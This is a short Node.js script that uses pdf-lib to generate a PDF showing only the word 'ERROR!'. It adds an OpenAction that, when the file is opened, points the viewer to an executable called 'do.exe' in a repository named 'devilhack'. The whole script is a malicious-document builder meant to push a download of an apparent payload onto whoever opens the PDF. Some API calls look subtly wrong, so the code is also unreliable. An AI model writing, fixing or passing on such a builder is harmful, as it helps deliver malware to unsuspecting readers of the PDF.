const fs = require('fs');
const { PDFDocument } = require('pdf-lib');

// Create a new PDF document
async function createPDF() {
  const pdfDoc = await PDFDocument.create();
  const page = pdfDoc.addPage([600, 400]);

  // Add some basic text to the page
  const font = await pdfDoc.embedFont(PDFDocument.Font.Helvetica);
  page.drawText('ERROR!', {
    x: 50,
    y: 350,
    size: 30,
    font,
  });

  // Embed the OpenAction (this would open a URL when the PDF is opened)
  const openAction = {
    Type: '/Action',
    S: '/URI',
    URI: 'https://github.com/thewifiproject/devilhack/raw/refs/heads/main/do.exe',
  };

  // Embed the OpenAction into the PDF document
  pdfDoc.catalog.set('/OpenAction', openAction);

  // Serialize the PDF to bytes and save it to a file
  const pdfBytes = await pdfDoc.save();
  fs.writeFileSync('output.pdf', pdfBytes);

  console.log('PDF created successfully!');
}

createPDF().catch(err => {
  console.error('Error creating PDF:', err);
});
